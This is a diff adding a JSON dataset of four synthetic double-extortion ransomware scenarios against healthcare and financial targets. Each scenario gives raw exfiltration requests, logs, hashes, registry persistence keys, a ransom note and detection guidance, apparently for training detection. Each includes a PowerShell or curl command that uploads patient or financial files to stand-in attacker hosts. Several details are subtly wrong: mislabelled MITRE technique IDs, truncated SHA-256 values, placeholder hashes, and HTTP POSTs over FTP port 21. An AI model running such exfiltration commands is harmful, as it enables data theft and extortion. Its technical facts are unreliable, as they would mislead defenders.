@@ -1,0 +1,216 @@
+{
+  "samples": [
+    {
+      "scenario": "Double extortion ransomware attack targeting a healthcare provider involving exfiltration of patient medical records via encrypted HTTPS upload before deploying ransomware to encrypt network shares and demanding ransom with threat to leak sensitive health data.",
+      "technical_data": {
+        "network_exfiltration_http": {
+          "raw_http_request": "POST /data/receive HTTP/1.1\r\nHost: secure-leak-site.net\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\nContent-Length: 1048576\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\r\nConnection: keep-alive\r\n\r\n[Binary encrypted archive containing exfiltrated patient records]",
+          "raw_http_response": "HTTP/1.1 202 Accepted\r\nDate: Wed, 21 Jun 2023 10:15:42 GMT\r\nContent-Type: application/json\r\nContent-Length: 60\r\nConnection: keep-alive\r\n\r\n{\"status\":\"accepted\",\"message\":\"data processed successfully\"}"
+        },
+        "network_packet_capture_snippet": "Frame 24567: 1024 bytes on wire (8192 bits), 1024 bytes captured (8192 bits)\nEthernet II, Src: 00:15:5d:4b:3c:2a, Dst: 40:8d:5c:1a:2b:3c\nInternet Protocol Version 4, Src: 192.168.5.23, Dst: 198.51.100.77\nTransmission Control Protocol, Src Port: 56345, Dst Port: 443, Seq: 87654, Ack: 23456, Len: 980\nHypertext Transfer Protocol\n    POST /data/receive HTTP/1.1\r\n    Host: secure-leak-site.net\r\n    Content-Type: application/octet-stream\r\n    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\r\n    Content-Length: 1048576\r\n    \n    [Payload: Binary encrypted archive (1048576 bytes)]",
+        "firewall_logs": "Jun 21 10:15:42 fw02 kernel: IN=eth1 OUT=eth0 SRC=192.168.5.23 DST=198.51.100.77 LEN=1024 TOS=0x00 PREC=0x00 TTL=64 ID=87654 DF PROTO=TCP SPT=56345 DPT=443 WINDOW=65535 RES=0x00 ACK URGP=0",
+        "endpoint_process_creation_log": "2023-06-21T10:14:55.987Z host-hlth01 SecurityEvent: ProcessCreate: ProcessId=7890 ParentProcessId=2300 Image=C:\\Users\\admin\\AppData\\Local\\Temp\\encryptor.exe CommandLine=\"C:\\Users\\admin\\AppData\\Local\\Temp\\encryptor.exe --encrypt --path \\\\192.168.5.0\\shared\\PatientRecords\"",
+        "file_hashes": {
+          "ransomware_executable": {
+            "md5": "a7c4f8b6d9f1e2c3b4d5e6f7890abcde",
+            "sha1": "b1a2c3d4e5f67890abcdef123456789012345678",
+            "sha256": "7d1f37a5b9c4e8f6a1234567890abcdef1234567890abcdef1234567890abcdef"
+          },
+          "exfiltrated_data_sample": {
+            "md5": "f96b697d7cb7938d525a2f31aaf161d0",
+            "sha1": "a54d88e06612d820bc3be72877c74f257b561b19",
+            "sha256": "9d5ed678fe57bcca610140957afab571"
+          }
+        },
+        "registry_artifacts": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdater = 'C:\\Users\\admin\\AppData\\Local\\Temp\\encryptor.exe'",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EncryptSvc = REG_DWORD 0x1 (auto-start malicious service)"
+        ],
+        "ransom_note_content": "All your files have been encrypted! Pay 75 BTC to the following wallet within 48 hours or your sensitive patient data will be published on the dark web.\nContact: helpdesk@securemail.com\n",
+        "exfiltration_tool_command": "powershell -Command \"Invoke-WebRequest -Uri https://secure-leak-site.net/data/receive -Method POST -Headers @{Authorization='Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'} -InFile C:\\PatientData\\export.enc -ContentType application/octet-stream\""
+      },
+      "indicators": {
+        "suspicious_domain": "secure-leak-site.net",
+        "ransomware_executable_hashes": {
+          "md5": "a7c4f8b6d9f1e2c3b4d5e6f7890abcde"
+        },
+        "unusual_http_posts": "POST /data/receive with octet-stream content type and large encrypted payload over HTTPS",
+        "registry_persistence_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdater",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EncryptSvc"
+        ],
+        "unusual_process_parenting": "encryptor.exe spawned by explorer.exe or another user process",
+        "exfiltration_activity": "Outbound HTTPS connections to unknown domains with large encrypted data uploads"
+      },
+      "detection_method": "Detect large outbound HTTPS POST requests with uncommon authorization headers to unknown domains, correlate with endpoint logs showing suspicious encryptor.exe process creation targeting network shares, and monitor registry for new auto-start entries related to unknown executables. Use DLP to detect sensitive healthcare data patterns leaving the network. EDR to identify mass file encryption and suspicious service creation.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1530 - Data from Network Shared Drive",
+        "T1560.002 - Archive Collected Data: Archive via Encrypted Archive",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1053 - Scheduled Task/Job (for persistence)",
+        "T1112 - Modify Registry"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware attack on a financial institution with exfiltration of confidential financial spreadsheets over a custom HTTP API before encrypting critical servers and threatening publication of financial information if ransom is not paid.",
+      "technical_data": {
+        "network_exfiltration_http": {
+          "raw_http_request": "POST /api/v1/upload HTTP/1.1\r\nHost: data-leak-finance.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/json\r\nContent-Length: 2097152\r\nAuthorization: Token 123456789abcdef\r\nConnection: keep-alive\r\n\r\n{\"filename\":\"financials.xlsx.enc\",\"data\":\"[Base64 encoded encrypted file data]\"}",
+          "raw_http_response": "HTTP/1.1 201 Created\r\nDate: Thu, 22 Jun 2023 08:20:30 GMT\r\nContent-Type: application/json\r\nContent-Length: 52\r\nConnection: keep-alive\r\n\r\n{\"status\":\"created\",\"message\":\"file upload successful\"}"
+        },
+        "network_packet_capture_snippet": "Frame 34589: 1500 bytes on wire (12000 bits), 1500 bytes captured (12000 bits)\nEthernet II, Src: 00:1a:4b:7c:d3:e9, Dst: 60:45:bd:12:34:56\nInternet Protocol Version 4, Src: 10.1.2.15, Dst: 203.0.113.99\nTransmission Control Protocol, Src Port: 49876, Dst Port: 443, Seq: 56789, Ack: 12345, Len: 1460\nHypertext Transfer Protocol\n    POST /api/v1/upload HTTP/1.1\r\n    Host: data-leak-finance.com\r\n    Content-Type: application/json\r\n    Authorization: Token 123456789abcdef\r\n    Content-Length: 2097152\r\n    \n    [Payload: Base64 encoded encrypted file data]",
+        "firewall_logs": "Jun 22 08:20:30 fw-fin01 kernel: IN=eth0 OUT=eth2 SRC=10.1.2.15 DST=203.0.113.99 LEN=1500 TOS=0x00 PREC=0x00 TTL=128 ID=12345 DF PROTO=TCP SPT=49876 DPT=443 WINDOW=8192 RES=0x00 ACK URGP=0",
+        "endpoint_process_creation_log": "2023-06-22T08:19:10.456Z host-fin01 SecurityEvent: ProcessCreate: ProcessId=11223 ParentProcessId=2100 Image=C:\\Windows\\Temp\\finance_lock.exe CommandLine=\"C:\\Windows\\Temp\\finance_lock.exe --encrypt --servers \\\\10.1.2.0\\finance_data\"",
+        "file_hashes": {
+          "ransomware_executable": {
+            "md5": "c4ca4238a0b923820dcc509a6f75849b",
+            "sha1": "1c8bfe8f8016e2f5c5f3c5e9f8a7c4d1e3b2a1f0",
+            "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+          },
+          "exfiltrated_data_sample": {
+            "md5": "098f6bcd4621d373cade4e832627b4f6",
+            "sha1": "a54d88e06612d820bc3be72877c74f257b561b19",
+            "sha256": "2c26b46b68ffc68ff99b453c1d30413413422f164b3d6a5e5a233f5a6a7a8d6a"
+          }
+        },
+        "registry_artifacts": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FinanceUpdater = 'C:\\Windows\\Temp\\finance_lock.exe'",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\FinLockService = REG_DWORD 0x1 (auto-start malicious service)"
+        ],
+        "ransom_note_content": "Your financial files have been encrypted! Send 100 BTC to the specified wallet within 72 hours or your confidential financial data will be publicly released.\nContact: financehelp@safe-mail.org\n",
+        "exfiltration_tool_command": "curl -X POST https://data-leak-finance.com/api/v1/upload -H \"Authorization: Token 123456789abcdef\" -H \"Content-Type: application/json\" -d @C:\\FinanceData\\financials.enc.json"
+      },
+      "indicators": {
+        "suspicious_domain": "data-leak-finance.com",
+        "ransomware_executable_hashes": {
+          "md5": "c4ca4238a0b923820dcc509a6f75849b"
+        },
+        "unusual_http_posts": "POST /api/v1/upload with JSON content containing large base64 encrypted file",
+        "registry_persistence_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FinanceUpdater",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\FinLockService"
+        ],
+        "unusual_process_parenting": "finance_lock.exe spawned by explorer.exe or user-initiated process",
+        "exfiltration_activity": "Outbound HTTPS connections to unknown financial data leak domain with large encoded file uploads"
+      },
+      "detection_method": "Monitor for large HTTPS POST requests to unknown external domains with JSON content containing base64 encoded large files. Correlate with endpoint logs showing finance_lock.exe creation targeting critical financial shares. Detect registry persistence keys and suspicious service creation. Use network DLP to detect financial data signatures. Employ EDR to identify mass encryption and registry modifications.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1530 - Data from Network Shared Drive",
+        "T1560.003 - Archive Collected Data: Archive via Custom Archive",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1053 - Scheduled Task/Job (for persistence)",
+        "T1112 - Modify Registry"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware attack targeting healthcare provider's internal network, involving exfiltration of medical records via encrypted HTTPS traffic before deployment of ransomware encrypting patient and operational data.",
+      "technical_data": {
+        "network_exfiltration_http": {
+          "raw_http_request": "POST /api/v1/upload/data HTTP/1.1\r\nHost: secure-data-exfil.attacker.net\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\nContent-Length: 1048576\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\r\nConnection: keep-alive\r\n\r\n[Encrypted binary data containing exfiltrated patient records in .json format]",
+          "raw_http_response": "HTTP/1.1 201 Created\r\nDate: Wed, 21 Jun 2023 09:15:30 GMT\r\nContent-Type: application/json\r\nContent-Length: 58\r\nConnection: keep-alive\r\n\r\n{\"status\":\"received\",\"message\":\"data upload successful\"}"
+        },
+        "network_packet_capture_snippet": "Frame 67890: 1024 bytes on wire (8192 bits), 1024 bytes captured (8192 bits)\nEthernet II, Src: 00:0a:95:9d:68:16, Dst: 3c:97:0e:af:34:56\nInternet Protocol Version 4, Src: 192.168.1.45, Dst: 104.21.32.15\nTransmission Control Protocol, Src Port: 56324, Dst Port: 443, Seq: 98765, Ack: 45678, Len: 1000\nHypertext Transfer Protocol over TLS\n    POST /api/v1/upload/data HTTP/1.1\r\n    Host: secure-data-exfil.attacker.net\r\n    Content-Type: application/octet-stream\r\n    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\r\n    Content-Length: 1048576\r\n    \n    [Payload: Encrypted binary data stream (1MB)]",
+        "firewall_logs": "Jun 21 09:15:30 fw-health kernel: IN=eth2 OUT=eth3 SRC=192.168.1.45 DST=104.21.32.15 LEN=1024 TOS=0x00 PREC=0x00 TTL=64 ID=9876 DF PROTO=TCP SPT=56324 DPT=443 WINDOW=65535 RES=0x00 ACK URGP=0",
+        "endpoint_process_creation_log": "2023-06-21T09:14:57.432Z host-health-02 SecurityEvent: ProcessCreate: ProcessId=7890 ParentProcessId=4100 Image=C:\\Windows\\Temp\\encryptor.exe CommandLine=\"C:\\Windows\\Temp\\encryptor.exe --encrypt --path C:\\PatientData\"",
+        "file_hashes": {
+          "ransomware_executable": {
+            "md5": "a3c9f0f7bc2a3e7e8f4b2a1f3d4e5c6b",
+            "sha1": "f4b645a2c3d1e5f78a9b0c1d2e3f4a56789abcd0",
+            "sha256": "b2f5ff47436671b6e533d8dc3614845d6f2a2c3e4b5a6789c0d1e2f3a4b5c6d7"
+          },
+          "exfiltrated_data_sample": {
+            "md5": "1a79a4d60de6718e8e5b326e338ae533",
+            "sha1": "c157a79031e1c40f85931829bc5fc552",
+            "sha256": "2c26b46b68ffc68ff99b453c1d30413413422f164f0b06a6f4a4e2f06d60e7ed"
+          }
+        },
+        "registry_artifacts": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EncryptorUpdater = 'C:\\Windows\\Temp\\encryptor.exe'",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\HealthRansomSvc = REG_DWORD 0x1 (auto-start malicious service)"
+        ],
+        "ransom_note_content": "All your files have been encrypted! Pay 75 BTC to the wallet below within 48 hours to decrypt your data and prevent exposure of your confidential patient records.\nContact: helpdesk@safecryptmail.com\n",
+        "exfiltration_tool_command": "powershell -Command \"Invoke-WebRequest -Uri https://secure-data-exfil.attacker.net/api/v1/upload/data -Method POST -Headers @{Authorization='Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'} -InFile C:\\PatientData\\records.json -ContentType application/octet-stream\""
+      },
+      "indicators": {
+        "suspicious_domain": "secure-data-exfil.attacker.net",
+        "ransomware_executable_hashes": {
+          "md5": "a3c9f0f7bc2a3e7e8f4b2a1f3d4e5c6b"
+        },
+        "unusual_http_posts": "POST /api/v1/upload/data with octet-stream content type and 1MB encrypted binary payload over HTTPS",
+        "registry_persistence_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EncryptorUpdater",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\HealthRansomSvc"
+        ],
+        "unusual_process_parenting": "encryptor.exe spawned by svchost.exe",
+        "exfiltration_activity": "Outbound encrypted HTTPS connections to unknown domain with large binary uploads"
+      },
+      "detection_method": "Analyze endpoint logs for suspicious process creations with encryption flags, monitor registry for new auto-start entries related to unknown executables, and correlate with firewall logs showing large outbound HTTPS POST requests to unrecognized domains. Deploy DLP solutions capable of decrypting SSL/TLS traffic or using metadata analysis. Employ EDR to detect mass encryption activity and abnormal parent-child process relationships.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1537 - Transfer Data to Cloud Account",
+        "T1560.002 - Archive Collected Data: Archive via Compression",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1053.005 - Scheduled Task (for persistence)",
+        "T1112 - Modify Registry"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware attack on a financial institution, involving exfiltration of transactional databases via FTP before encrypting critical systems and threatening public data release unless ransom is paid.",
+      "technical_data": {
+        "network_exfiltration_http": {
+          "raw_http_request": "POST /ftp/upload.php HTTP/1.1\r\nHost: ftp-malicious-actor.com\r\nUser-Agent: curl/7.68.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 2097152\r\nAuthorization: Basic ZnRwVXNlcjpzZWNyZXQxMjM=\r\nConnection: close\r\n\r\n[Binary data stream containing exported financial transaction database dump]",
+          "raw_http_response": "HTTP/1.1 200 OK\r\nDate: Thu, 22 Jun 2023 12:40:10 GMT\r\nContent-Type: text/plain\r\nContent-Length: 25\r\nConnection: close\r\n\r\nUpload successful, thank you."
+        },
+        "network_packet_capture_snippet": "Frame 34567: 1500 bytes on wire (12000 bits), 1500 bytes captured (12000 bits)\nEthernet II, Src: 00:15:5d:4b:01:23, Dst: 8c:85:90:27:ab:cd\nInternet Protocol Version 4, Src: 172.16.5.10, Dst: 198.51.100.22\nTransmission Control Protocol, Src Port: 61532, Dst Port: 21, Seq: 54321, Ack: 98765, Len: 1460\nHypertext Transfer Protocol\n    POST /ftp/upload.php HTTP/1.1\r\n    Host: ftp-malicious-actor.com\r\n    Content-Type: application/octet-stream\r\n    Authorization: Basic ZnRwVXNlcjpzZWNyZXQxMjM=\r\n    Content-Length: 2097152\r\n    \n    [Payload: Binary data stream (2MB)]",
+        "firewall_logs": "Jun 22 12:40:10 fw-finance kernel: IN=eth0 OUT=eth1 SRC=172.16.5.10 DST=198.51.100.22 LEN=1500 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=61532 DPT=21 WINDOW=8192 RES=0x00 ACK URGP=0",
+        "endpoint_process_creation_log": "2023-06-22T12:39:50.678Z host-fin-03 SecurityEvent: ProcessCreate: ProcessId=10234 ParentProcessId=2001 Image=C:\\Windows\\Temp\\finransom.exe CommandLine=\"C:\\Windows\\Temp\\finransom.exe --encrypt --dir C:\\FinanceData\"",
+        "file_hashes": {
+          "ransomware_executable": {
+            "md5": "f96b697d7cb7938d525a2f31aaf161d0",
+            "sha1": "3a7bd3e2360a3d8a0a3a0d94b8c0a6f3b5e9f7d1",
+            "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+          },
+          "exfiltrated_data_sample": {
+            "md5": "098f6bcd4621d373cade4e832627b4f6",
+            "sha1": "ad0234829205b9033196ba818f7a872b",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          }
+        },
+        "registry_artifacts": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FinanceUpdater = 'C:\\Windows\\Temp\\finransom.exe'",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\FinRansomSvc = REG_DWORD 0x1 (auto-start malicious service)"
+        ],
+        "ransom_note_content": "Your financial systems are encrypted! Transfer 100 BTC to the address below in 72 hours or your sensitive transaction databases will be leaked publicly.\nContact: finance-support@cryptomail.com\n",
+        "exfiltration_tool_command": "curl -X POST ftp://ftp-malicious-actor.com/upload.php -u ftpUser:secret123 --data-binary @C:\\FinanceData\\transactions.db"
+      },
+      "indicators": {
+        "suspicious_domain": "ftp-malicious-actor.com",
+        "ransomware_executable_hashes": {
+          "md5": "f96b697d7cb7938d525a2f31aaf161d0"
+        },
+        "unusual_http_posts": "POST /ftp/upload.php with octet-stream content type and large binary payload over FTP port 21",
+        "registry_persistence_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\FinanceUpdater",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\FinRansomSvc"
+        ],
+        "unusual_process_parenting": "finransom.exe spawned by cmd.exe",
+        "exfiltration_activity": "Outbound FTP connections to unknown IPs/domains uploading multi-megabyte files"
+      },
+      "detection_method": "Monitor for large outbound FTP or HTTP POST requests to suspicious domains, correlate with endpoint logs for unknown processes executing encryption commands, and watch registry for new persistence entries linked to suspicious executables. Use network traffic analysis to detect abnormal FTP data transfers. Endpoint detection and response tools to flag mass file encryption and suspicious process trees.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1567.002 - Exfiltration Over FTP",
+        "T1560.003 - Archive Collected Data: Archive via Custom Compression",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.003 - Application Layer Protocol: File Transfer Protocols",
+        "T1053.003 - Scheduled Task/Job: At (for persistence)",
+        "T1112 - Modify Registry"
+      ]
+    }
+  ]
+}
